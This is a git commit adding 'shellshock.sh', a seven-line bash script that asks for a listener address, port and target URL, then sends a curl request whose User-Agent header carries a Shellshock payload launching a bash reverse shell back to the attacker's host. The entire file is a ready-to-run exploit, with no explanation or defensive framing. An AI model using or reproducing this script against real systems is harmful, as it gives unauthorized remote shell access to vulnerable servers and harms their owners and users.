4c1ce2e40d5a28c2777436f739fbc0558e757d99
CipherStriker <156460651+CipherStriker@users.noreply.github.com>
2024-05-16 12:54:32 +0530

    Create shellshock.sh

---
+++ CustomScripts/shellshock.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+
+read -p "LHOST IP: " lhost
+read -p "LHOST PORT: " lport
+echo "Start Listner on port "$lport
+read -p "URL: " url
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'" $url&
